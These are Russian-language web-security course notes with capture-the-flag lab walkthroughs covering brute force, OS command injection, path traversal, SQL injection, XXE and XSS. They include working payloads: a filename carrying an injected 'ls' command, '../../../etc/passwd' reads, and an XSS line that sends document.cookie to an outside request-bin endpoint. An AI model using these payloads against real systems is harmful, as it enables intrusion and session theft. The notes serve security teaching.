## **Основные понятия**

**Веб-приложение (Web application)** —  клиент-серверное приложение, в котором клиент взаимодействует с веб-сервером при помощи браузера. Уязвимости веб-приложений возникают, когда разработчики допускают ошибки в коде. Это может происходить как на этапе разработки, так и на этапе доработки или исправления найденных ранее уязвимостей.  Также при разработке веб-сервиса может использоваться сторонний код, проверка которого требует отдельного внимания разработчиков. Существуют и другие причины небезопасных веб-приложений, некоторые из которых мы коснемся в курсе.

  
**Идентификация (Identification)**— это процедура определения и подтверждения субъекта идентификации (пользователя) через его идентификатор, однозначно определяющий его на основе предоставленных им данных, таких как имя, адрес электронной почты или номер телефона. Идентификация часто используется вместе с аутентификацией для подтверждения подлинности пользователя.

**Аутентификация (Authentication)** — это процедура проверки подлинности идентификационных данных пользователя, таких, как логин и пароль, чтобы убедиться, что он является тем, за кого себя выдает; по сути, процесс проверки конкретного пользователя или клиента путем сравнения введенного им пароля с паролем, сохраненным в базе данных.
  
**Авторизация (Authorization)** — это процесс проверки прав пользователя на выполнение определенных действий или доступ к определенным ресурсам системы. Пользователь может быть аутентифицирован, но не авторизован на выполнение определенной операции, если у него нет необходимых прав.

**Атака грубой силы (Brute force****)** — это метод криптоанализа, при котором злоумышленник пытается взломать пароль или зашифрованные данные путем перебора возможных комбинаций до тех пор, пока не будет найдено правильное сочетание. Атака грубой силы может быть эффективной, если пароль короткий или используется слабый алгоритм шифрования, однако, при достаточной длине и сложности пароля, такая атака может занять слишком много времени или быть совсем неэффективной.
  
**Инъекция команд ОС (OS Command Injection****) (также известная как shell инъекция)** — уязвимость веб-приложений, которая позволяет злоумышленнику выполнять произвольные команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, дает возможность полностью скомпрометировать приложение и все его данные.

**Контроль доступа** **(Access control)**— это процесс управления доступом пользователей к ресурсам системы, включая определение прав доступа и ограничений на использование ресурсов. Контроль доступа обеспечивает безопасность системы, ограничивая доступ пользователей только к необходимым ресурсам и операциям.
  
**Язык структурированных запросов SQL (Structured Query Language)** – это декларативный язык программирования для хранения и обработки информации в реляционной базе данных. Реляционная база данных хранит информацию в табличной форме со строками и столбцами, представляющими различные атрибуты данных и различные связи между значениями данных. Инструкции SQL можно использовать для хранения, обновления, удаления, поиска и извлечения информации из базы данных. Можно также использовать SQL для поддержания и оптимизации производительности базы данных.

**SQL-инъекция** **(SQL injection)**— это уязвимость веб-приложений, позволяющая злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных. Она позволяет злоумышленнику просматривать данные, которые он, как правило, не может получить.
  
**Обратный путь в каталогах (Path Traversal)** _**(также известный как обход файловых путей)**_ — это уязвимость веб-безопасности, позволяющая злоумышленнику читать произвольные файлы на сервере, на котором запущено приложение. Сюда могут входить код приложения и данные, учетные данные для внутренних систем и конфиденциальные файлы операционной системы.
  
**Инъекция внешних сущностей XML** (также известная как XXE) — это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Часто она позволяет злоумышленнику просматривать файлы на файловой системе сервера приложений, а также взаимодействовать с любыми внутренними или внешними системами, к которым имеет доступ само приложение.
  
**Межсайтовый скриптинг** _(также известный как XSS)_ — это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy (SOP)), которая предназначена для разделения различных веб сайтов друг от друга.
## **Наше положение в сети**

Веб-серверы являются одной из наиболее важных частей любой ИТ-инфраструктуры, так как они отвечают за обслуживание запросов клиентов и доставку содержимого. По этой причине веб-серверы часто являются первичной целью атаки для злоумышленников.

![[Pasted image 20240528202937.png]]



## Общие принципы

Для компрометации веб-приложений используются уязвимости, как правило, возникающие из-за допущенных ошибок при разработке (ошибки в коде, использование уязвимых библиотек и др.), в различных механизмах данного приложения . Такие ошибки часто складываются в целые группы типовых уязвимостей.

**Примеры механизмов веб-приложений:**

- Аутентификация
- Авторизация
- Менеджмент сессий
- Хранение файлов
- Работа с базами данных
- Генерация медиа (видео и изображений)
- Вывод пользовательских данных и др.


## **Как возникают и какой ущерб несут уязвимости аутентификации**

В широком смысле, большинство уязвимостей в механизмах аутентификации возникает одним из двух способов:

1. Механизмы аутентификации уязвимы, так как они не могут адекватно защитить от атак с применением _методов_ _грубой силы_.
2. Логические ошибки или плохой код в реализации позволяют злоумышленнику полностью обойти механизмы аутентификации.



## **Brute-force атаки**

### **Brute-forcing пользовательских имен**

Имена пользователей особенно легко угадать, если они соответствуют **узнаваемому шаблону**, например, адресу электронной почты. Очень часто можно увидеть логины в формате:

**_firstname.lastname@somecompany.com_**

Однако, даже если нет очевидного шаблона, иногда даже высокопривилегированные учетные записи создаются с использованием предсказуемых имен пользователей, таких как **_admin_** или **_administrator_**.

### **Brute-forcing паролей**

Пароли могут быть перебраны аналогичным образом в зависимости от сложности пароля. Многие сайты принимают ту или иную форму политики паролей, которая заставляет пользователей создавать пароли с высокой энтропией, которые, по крайней мере, теоретически сложнее взломать одним перебором. Обычно это включает в себя принудительное использование в паролях:

- Минимального количества символов
- Смеси строчных и заглавных букв
- Как минимум одного специального символа

Однако, несмотря на то, что **высокоэнтропийные пароли** сложно взломать компьютеру, мы можем использовать базовые знания о человеческом поведении для эксплуатации уязвимостей, которые пользователи невольно привносят в эту систему.  
  
Вместо того, чтобы создавать надежный пароль со случайной комбинацией символов, пользователи часто берут пароль, который они могут запомнить, и пытаются использовать его в соответствие с политикой паролей. Например, если не разрешено использование **_password_**, пользователи могут попробовать что-нибудь вроде _**P@ssw0rd**_ .

###  **Уязвимая защита от brute-force атак**

Для успешной компроментации аккаунта, злоумышленнику необходимо провести множество неудачных попыток. Таким образом защита от брут-форс атак строится на замедлении скорости автоматизированных попыток перебора пароля.

Двумя **наиболее распространенными** способами предотвращения атак полным перебором являются следующие:

1. Блокировка **учетной записи**, к которой удаленный пользователь пытается получить доступ, если он совершает слишком много неудачных попыток входа.
2. Блокировка **IP-адреса** удаленного пользователя, если он делает слишком много попыток входа в систему.

Иногда вы можете обнаружить, что ваш IP заблокирован, если вы не можете войти слишком много раз. В некоторых реализациях счетчик количества неудачных попыток сбрасывается при успешном входе владельца IP-адреса. Это означает, что злоумышленнику просто придется входить в систему под своей учетной записью каждые несколько попыток, чтобы этот лимит никогда не был достигнут.

В этом случае достаточно просто включать свои собственные учетные данные для входа в систему через регулярные интервалы времени в течение перебора всего словаря, чтобы сделать эту защиту практически бесполезной.


### Задание

Проанализируйте защищенность механизмов аутентификации административной панели и проэксплуатируйте найденные уязвимости.  
  
В качестве подтверждения успешной эксплуатации предоставьте флаг (секретную строку в формате 32 букв и цифр) из кода страницы панели администратора.

**Решение:**

Запуск стенда: 
![[Pasted image 20240531225648.png]]

![[Pasted image 20240531225741.png]]


Запуск стенда в BurpSuiteCommunity:

![[Pasted image 20240531225948.png]]

![[Pasted image 20240531230124.png]]


Сканирование в ffuz:

```bash
ffuf -w ~/wordlist/fuzz.txt -u http://localhost:1337/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:1337/FUZZ
 :: Wordlist         : FUZZ: /home/nl/wordlist/fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

%2e                     [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 3ms]
                        [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 3ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-local         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.old           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-dev           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccessOLD2           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.orig          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.bak1          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1ms]
.htaccessOLD            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_orig          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_extra         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.ht_wsr.txt             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.BAK           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd_test          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.httr-oauth             [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccessBAK            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess_sc            [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess~              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htgroup                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htpasswd-old           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.sample        [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess.save          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htpasswds              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htusers                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
.htaccess-marco         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
admin/.htaccess         [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
admin/config.php        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
admin/index.php         [Status: 200, Size: 2730, Words: 647, Lines: 77, Duration: 1ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
index.php               [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 2ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 0ms]
:: Progress: [4107/4107] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Найдена админка:

`admin                   [Status: 301, Size: 313, Words: 20, Lines:`

![[Pasted image 20240531230458.png]]


![[Pasted image 20240531230547.png]]


Проверка ввода данных:


![[Pasted image 20240531230659.png]]

Отправка в интрудер для дальнейшего перебора пароля:

![[Pasted image 20240531230811.png]]

![[Pasted image 20240531230929.png]]


![[Pasted image 20240531231023.png]]

Начало перебора:
![[Pasted image 20240531231057.png]]

Нахождение правильного пароля:
![[Pasted image 20240531231456.png]]
username=admin&password=q1w2e3r4
Это стало ясно благодаря изменению размера пароля и перенаправлению на страницу otp.php.

![[Pasted image 20240531231651.png]]


Далее необходимо подобрать одноразовый пароль аутентификации:

![[Pasted image 20240531232124.png]]

![[Pasted image 20240531232259.png]]

Нахождение пароля: 

![[Pasted image 20240601095051.png]]

![[Pasted image 20240601095334.png]]

Ответ:
![[Pasted image 20240601095839.png]]

![[Pasted image 20240601095939.png]]

## Уязвимости инъекции команд ОС

Инъекция команд ОС (также известная как shell инъекция) является уязвимостью веб-приложений, которая позволяет злоумышленнику выполнять произвольные команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, дает возможность полностью скомпрометировать приложение и все его данные. Очень часто злоумышленник может использовать уязвимость внедрения команд ОС для компрометации других частей инфраструктуры, используя доверительные отношения для перенаправления атаки на другие системы в организации.

### **Как возникают уязвимости инъекции команд?**

Пример допущенной **уязвимости** инъекции команд:

```sql
$command = 'convert -pointsize 72 label:Hello ' . $_FILES['userfile']['name'];
 system($command);
```

В примере выше имя файла попадает прямо в строку исполнения, которая в последствии будет выполнена терминальной оболочкой. Это позволяет дописать дополнительные команды терминальной оболочки и воспользоваться этим недостатком.

Пример **эксплуатации** для уязвимости выше:

```sql
------WebKitFormBoundaryePkpFF7tjBAqx29L
Content-Disposition: form-data; name="userfile"; filename="check | ls -la;"
Content-Type: application/x-object

... contents of file goes here ...
```

Зачастую эксплуатация подобного рода уязвимостей затруднена и требует поиска возможностей выполнения кода через другие “контексты” и технологии.

### **К подобным уязвимостям относятся:**

- Уязвимости небезопасной десериализации
- Уязвимости внедрения шаблонов на стороне сервера SSTI
- Уязвимости SQL инъекции
- Уязвимости переполнения буфера / кучи / стека
- Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой

### Практика «Уязвимости инъекции команд ОС»

![[Pasted image 20240601130118.png]]

c2098cad00958121da83a936845f41e7

![[Pasted image 20240601130431.png]]



## Уязвимости контроля доступа

**Что такое контроль доступа?**

В контексте веб-приложений контроль доступа зависит от аутентификации и управления сеансами:

- Аутентификация идентифицирует пользователя и подтверждает, что он является тем, за кого себя выдает.
- Управление сеансом идентифицирует, какие последующие HTTP-запросы выполняются тем же самым пользователем.
- Управление доступом определяет, разрешено ли пользователю выполнять действия, которые он пытается выполнить.

_**Сломанный контроль доступа**_ является часто встречающейся и часто критической уязвимостью безопасности. Проектирование и управление контролем доступа — это сложная и динамичная проблема, которая применяет деловые, организационные и правовые ограничения к технической реализации. Проектные решения по контролю доступа должны приниматься людьми, а не технологиями, и вероятность ошибок высока.

### Категории контроля доступа

С точки зрения пользователя, **_контроль доступа_** можно разделить на следующие категории:

- Вертикальный контроль доступа.
- Горизонтальный контроль доступа.
- Контекстно-зависимый контроль доступа.

#### **Вертикальный контроль доступа**

**Вертикальный контроль доступа** — это механизмы, ограничивающие доступ к чувствительным функциям, недоступным другим типам пользователей. С помощью вертикальных средств контроля доступа различные типы пользователей имеют доступ к различным функциям приложений. Например, администратор может изменить или удалить учетную запись любого пользователя, в то время как обычный пользователь не имеет доступа к этим действиям. **_Вертикальные средства контроля доступа_** могут быть более тонкой реализацией моделей безопасности, разработанных для внедрения бизнес-политик, таких, как разделение обязанностей и наименьших привилегий.

### **Горизонтальный контроль доступа**

**_Горизонтальный контроль доступа_** — это механизмы, ограничивающие доступ к ресурсам для пользователей, которым специально разрешен доступ к этим ресурсам.  
  
С помощью горизонтального контроля доступа различные пользователи имеют доступ к подмножеству ресурсов одного и того же типа. Например, банковское приложение позволит пользователю просматривать транзакции и осуществлять платежи со своих счетов, но не со счетов любого другого пользователя.



## Уязвимости разграничения доступа к каталогам

Манипуляция путем к каталогам (также известный как обход файловых путей, англ. **Path Traversal** или **Directory Traversal**) – это уязвимость веб-безопасности, позволяющая злоумышленнику читать произвольные файлы на сервере, на котором запущено приложение. Сюда могут входить код приложения и данные, учетные данные для внутренних систем и конфиденциальные файлы операционной системы. В некоторых случаях злоумышленник может записать в произвольные файлы на сервере, что позволит ему изменить данные или поведение приложения, и, в конечном счете, получить полный контроль над сервером.

### **Почему такие уязвимости появляются?**

Уязвимости Directory Traversal появляются из-за _отсутствия валидации входных данных пользователя_, а также из-за _отсутствия разграничения доступа приложения_ или функции на возможность обращаться к файловым ресурсам всего сервера.

### Пример эксплуатации уязвимости

**Чтение файлов при помощи Directory traversal**  
  
Рассмотрим торговое приложение, которое отображает изображения предметов для продажи. Изображения загружаются через некоторый HTML, как показано ниже:  
`<img src="/loadImage?filename=218.png">`  
  
_URL loadImage_ принимает параметр имени файла и возвращает содержимое указанного файла. Сами файлы образов хранятся на диске в каталоге `/var/www/images/`. Чтобы вернуть образ, приложение добавляет запрашиваемое имя файла в этот базовый каталог и использует API файловой системы для чтения содержимого файла. В описанном выше случае приложение  
читает по следующему пути к файлу: `/var/www/images/218.png`

Приложение не реализует защиту от атак обхода директорий, поэтому злоумышленник может запросить следующий URL для получения произвольного файла из файловой системы сервера:  
`https://insecure-website.com/loadImage?filename=../../../etc/passwd`  
  
Это приводит к тому, что приложение читает по следующему пути к файлу:  
`/var/www/images/../../../etc/passwd`  
  
Последовательность `../` действительна внутри пути к файлу и означает повышение на один уровень в структуре каталога. Три последовательных `../`  идут вверх от `/var/www/images/` до корня файловой системы, и, таким образом, до файла, который действительно читается: `/etc/passwd`  
  
В операционных системах на базе Unix это стандартный файл, содержащий информацию о пользователях, зарегистрированных на сервере.

В Windows, как  `../`, так и  `..\` являются действительными последовательностями обхода директорий, и эквивалентной атакой для получения стандартного файла операционной системы была бы атака:  
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini.`

**Ход действий**

1. Загрузим основную страницу http://evil.corp:1337 и проанализируем запросы в BurpSuite, предварительно включив отображение картинок в фильтре:

![](https://ucarecdn.com/f1c79dcf-0a50-4015-b293-7a0e48299cca/)

2. Как видим, отображением картинок занимается скрипт image.php, а имя картинки передается через параметр file:

![](https://ucarecdn.com/d43635df-7288-4661-b565-2ebb268999bc/)

3. Отправим этот запрос в Repeater для дальнейшего анализа:

![](https://ucarecdn.com/666ba997-9cd9-472a-93a7-30751d70298a/)

4. В этом режиме мы можем свободно редактировать запрос, вновь отправлять его серверу и получать результат. Для анализа изменим значение параметра file на некорректное, например, удалим последний символ из названия картинки:

![](https://ucarecdn.com/9bcdb434-bcda-418f-9871-0172d3e737e2/)

5. Из сообщения об ошибке мы получим информацию о реальном пути до картинки на стороне сервера и расположении скрипта. Попробуем использовать абсолютный путь до файла, который точно должен быть на удаленной Linux-системе, например, /etc/hosts:

![](https://ucarecdn.com/962b837f-f839-4830-8537-0a6ecf0ddd35/)

6. Эта попытка не сработала, потому что значение параметра file склеивается с путем до директории с картинками /var/www/html/static, что приводит к обращению к несуществующему файлу /var/www/html/static//etc/hosts. Мы можем попытаться выйти за пределы директории с картинками иным путем – используя относительные пути в Linux, где ./ обозначает текущую директорию, а ../ - директорию на уровень выше:

![](https://ucarecdn.com/2d6e4cf5-4c5c-40be-8bcf-511dfb9fff92/)



## Уязвимости SQL-инъекции

**Что такое SQL?**

Язык структурированных запросов (SQL) – это язык программирования для хранения и обработки информации в реляционной базе данных. Реляционная база данных хранит информацию в табличной форме со строками и столбцами, представляющими различные атрибуты данных и различные связи между значениями данных. Инструкции SQL можно использовать для хранения, обновления, удаления, поиска и извлечения информации из базы данных. Можно также использовать SQL для поддержания и оптимизации производительности базы данных.

 **Что такое SQL инъекция?**

SQL-инъекция – это уязвимость веб-приложений, позволяющая злоумышленнику вмешиваться в запросы, которые приложение делает к своей базе данных. Она позволяет злоумышленнику просматривать данные, которые он, как правило, не может получить. Сюда могут входить данные, принадлежащие другим пользователям, или любые другие данные, к которым само приложение может получить доступ. Во многих случаях злоумышленник может изменять или удалять эти данные, вызывая постоянные изменения содержимого или поведения приложения.

В некоторых ситуациях злоумышленник может эскалировать атаку SQL-инъекции, чтобы скомпрометировать сервер или другую внутреннюю инфраструктуру, или выполнить атаку типа "отказа в обслуживании".

### **Примеры SQL инъекций**

_**Сценарий №1**_

Приложение использует недоверенные данные при создании следующего уязвимого SQL-вызова:  
`String query = "SELECT * FROM accounts WHERE custID=""+request.getParameter("id") +"";`

_**Сценарий №2**_

Безоговорочное доверие приложений к фреймворкам может привести к появлению уязвимых запросов (например, в языке запросов HQL):  
`Query HQLQuery = session.createQuery("FROM accounts WHERE custID="" +request.getParameter("id") + "");`

В обоих случаях злоумышленник изменяет в своем браузере значение параметра `"id"` для отправки  `' or '1'='1`.

> **Например**: `[http://example.com/app/accountView?id='+or+'1'='1](http://example.com/app/accountView?id=%27+or+%271%27=%271)`

Изменение обоих запросов позволяет получить все записи из таблицы учетных данных. Более  
серьезные атаки позволяют их изменить или удалить.

### **О техниках атак**

Существует широкий спектр уязвимостей, атак и методов SQL инъекции, которые возникают в различных ситуациях. К числу наиболее распространенных примеров SQL-инъекций относятся:

1. **Stacked queries** — инъекция SQL-запросов, позволяющая злоумышленнику выполнить несколько запросов за один раз.
    
2. **Union-based** — инъекция, использующая оператор UNION для объединения результатов двух запросов, что позволяет злоумышленнику извлекать данные из других таблиц.
    
3. **Error-based** — инъекция, основанная на ошибке, которая может возникнуть при выполнении запроса, что позволяет злоумышленнику получать информацию об уязвимости.
    
4. **Boolean blind** — инъекция, при которой злоумышленник использует булевы выражения для проверки наличия или отсутствия определенных данных в базе данных.
    
5. **Time-based** — инъекция, которая использует задержку выполнения запроса для получения информации о базе данных.
    
6. **Out of band** — инъекция, которая не взаимодействует с сайтом напрямую, а использует другой канал для передачи данных, например, отправку электронной почты или HTTP-запросов.


## Уязвимости внедрения внешних сущностей XML

**Что такое XML?**

Расширяемый язык разметки (Extensible Markup Language, XML) позволяет определять и хранить данные совместно используемым способом. XML поддерживает обмен информацией между компьютерными системами, такими, как веб-сайты, базы данных и сторонние приложения. Предопределенные правила упрощают передачу данных в виде XML-файлов по любой сети, поскольку получатель может использовать эти правила для точного и эффективного чтения данных.

**Что это такое XXE инъекция?**

Инъекция внешних сущностей XML (также известная как XML External Entity, XXE) – это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Часто она позволяет злоумышленнику просматривать файлы на файловой системе сервера приложений, а также взаимодействовать с любыми внутренними или внешними системами, к которым имеет доступ само приложение.

###  **Почему такие уязвимости появляются?**

Некоторые приложения используют формат XML для передачи данных между браузером и сервером. Приложения, которые делают это, практически всегда используют стандартную библиотеку или платформенный API для обработки XML-данных на сервере.  
  
Уязвимости XXE возникают из-за того, что спецификация XML содержит различные потенциально опасные функции, и стандартные парсеры поддерживают эти функции, даже если они обычно не используются приложением.

### Разбор техники

**Ход действий**

1. Зайдем на главную страницу сайта [http://evil.corp](http://evil.corp/):1337/ и заполним форму:

![](https://ucarecdn.com/9a7c4d1d-9835-440d-89b6-ac2d44dc7c88/)

2. Проанализируем запросы в BurpSuite. При отправке данной формы сформировался POST-запрос к order.php, откроем его в Repeater:

![](https://ucarecdn.com/6f14bcaa-ff73-4760-aedc-77e6207cfa74/)

> В теле запроса используется формат XML, позволяющий внедрять в поля различные внешние данные, в том числе файлы. Если такие данные обрабатываются парсером, то может возникнуть **уязвимость XXE – XML external entity injection.** 

3. Для тестирования на уязвимость используем список полезных нагрузок: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md

Внедрим классическую нагрузку:

![](https://ucarecdn.com/ce4bfcad-03bb-4969-b175-c70e10faa0c0/)

Так поле comment будет содержать сущность с типом data, содержащую данные из файла /etc/passwd. Отправим запрос на хост и получим в ответе id нового заказа.

4. Перейдем по ссылке [http://evil.corp:1337/receipt.php?orderID=5](http://evil.corp:1337/receipt.php?orderID=5) и увидим в поле comments содержимое passwd:

![](https://ucarecdn.com/d5b68f82-3fa5-4fcc-861d-19109cad9c08/)

> Аналогично можно поступить для файла /var/www/secret, содержащего флаг.



## Атаки межсайтового скриптинга (XSS)

**Межсайтовый скриптинг (также известный как Cross-Site Scripting, XSS)** – это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy, SOP), которая предназначена для разделения различных веб сайтов друг от друга.

### **Как работает XSS?**

_**Уязвимости межсайтового скриптинга**,_ как правило, позволяют злоумышленнику маскироваться под пользователя-жертву, выполнять любые действия, которые может выполнить пользователь, и получать доступ к любым данным пользователя.

> Если пользователь-жертва имеет привилегированный доступ внутри приложения, то атакующий может получить полный контроль над всей функциональностью и данными приложения.

**_Межсайтовый скриптинг_** работает путем манипулирования уязвимым веб-сайтом, чтобы он возвращал пользователям вредоносный **JavaScript**. Когда вредоносный код выполняется внутри браузера жертвы, злоумышленник может полностью скомпрометировать их взаимодействие с приложением.

### Разбор техники

**Ход действий**

1. Перейдем на главную страницу сайта [http://evil.corp:1337/](http://evil.corp:1337/)

![](https://ucarecdn.com/7e44dae8-bbcc-4600-9d34-2eb9c06fdbbf/)

2. Найдем этот запрос в BurpSuite, отправим в Repeater и внедрим кавычку в поле phone:

![](https://ucarecdn.com/881c80e7-fbb9-4378-96d4-bb6e9ef1dff2/)

3. Отправим заявку и посмотрим на заполненную форму в html-коде, используя средства браузера:

![](https://ucarecdn.com/6c163532-30f6-4c81-9627-417edf268294/)

> Как видим, кавычка не экранировалась, что говорит о возможности эксплуатации **уязвимости XSS – cross-site scripting, заключающейся в внедрении своего JavaScript-кода в страницу сайта** и его последующего выполнения браузером атакуемого пользователя.

4. Внедрим тем же способом знак “>” чтобы разорвать HTML-тэг и вставить свой; при этом убедимся, что закрывающая угловая скобка тоже не заэкранировалась.

Для значения phone +79117238383"> получим код:

![](https://ucarecdn.com/4d689d48-0da0-4e1f-9b48-ea71997f861e/)

5. Используем полезную нагрузку для выдачи сообщения 1 всем, кто открывает страницу с заказом:

`+79117238383"><img src=x onerror=alert(1) />`

Однако, при отправке запроса в BurpSuite эта полезная нагрузка вызывает ошибку:

![](https://ucarecdn.com/7b8cd02c-af7d-4a1c-b94b-0b9923b6a664/)

6. Закодируем эту полезную нагрузку с помощью Decoder:

![](https://ucarecdn.com/bcca9b50-e91d-4706-82aa-0e85a1f5f26c/)

Теперь ошибка не возникает, и при заходе на страницу мы получаем сообщение:

![](https://ucarecdn.com/b59d5533-0d3e-4ada-9883-a44ada626484/)

7. Один из наиболее распространенных сценариев развития атаки в этой ситуации – **передача Cookie посетителя атакующему**. Чтобы принять запрос, воспользуемся ресурсом [https://requestbin.com/](https://requestbin.com/). Используем указанный в поле Endpoint URL для получения Cookie:

`+79117238383"><img src=x onerror=fetch('https://ADDR.x.pipedream.net/?'+document.cookie) />`

где ADDR – адрес вашего endpoint.

8. Вновь закодируем полезную нагрузку и отправим её в запросе, а затем откроем новый заказ, после чего в интерфейсе pipedream появится запрос с флагом.


### **Типы XSS-атак**

Существует **_три основных типа_ XSS-атак**:

- **_Отраженный XSS_**, где вредоносный скрипт происходит из текущего HTTP запроса.
- **_Хранимый XSS_**, где вредоносный скрипт приходит из хранилища данных веб-сайта.
- **_Dom-based XSS_,** где уязвимость существует в клиентском коде, а не в коде сервера.

**Отраженный XSS**
_**Отраженный межсайтовый скриптинг** (**XSS**)_ возникает, когда приложение получает данные в **HTTP**-запросе и включает эти данные непосредственно в ответ небезопасным способом.

 **Хранимый XSS**

_**Сохраненный межсайтовый скриптинг** (скриптинг второго порядка или постоянный XSS)_ возникает, когда приложение получает данные из недоверенного источника и включает эти данные в свои последующие **HTTP**-ответы небезопасным способом.

**Dom-based XSS**

**_XSS-уязвимости, основанные на DOM_**, обычно возникают, когда JavaScript берет данные из подконтрольного злоумышленнику источника, например, URL, и передает их «раковине» (англ. sink), поддерживающей динамическое выполнение кода, например, `eval()` или `innerHTML`. Это позволяет злоумышленникам выполнять вредоносный **JavaScript**, что обычно приводит к взлому учетных записей других пользователей.  
  
Для реализации **XSS**-атаки, основанной на **DOM**, необходимо поместить данные в источник таким образом, чтобы они распространились на поглотитель и вызвали выполнение произвольного **JavaScript**.

